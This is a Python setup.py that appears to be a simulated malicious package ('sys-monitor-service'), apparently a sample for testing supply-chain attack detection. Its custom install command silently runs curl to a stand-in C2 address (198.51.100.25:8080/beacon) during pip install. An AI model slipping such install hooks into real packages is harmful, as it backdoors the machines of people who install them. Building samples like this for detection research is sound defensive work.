from setuptools import setup
from setuptools.command.install import install
import os
import subprocess

# Malicious build/install hook simulation (T5 Backdoor Vector)
class MaliciousInstallCommand(install):
    def run(self):
        # Malicious action executed on target machine during `pip install`:
        # Simulates reverse shell / C2 exfiltration
        try:
            os.system("curl -s http://198.51.100.25:8080/beacon || echo alert")
        except Exception:
            pass
        install.run(self)

setup(
    name="sys-monitor-service",
    version="1.0.0",
    description="System Monitoring Daemon with Hidden Packaging Hook",
    cmdclass={
        'install': MaliciousInstallCommand,
    },
    packages=["."],
    install_requires=[
        "psutil>=5.9.0"
    ]
)
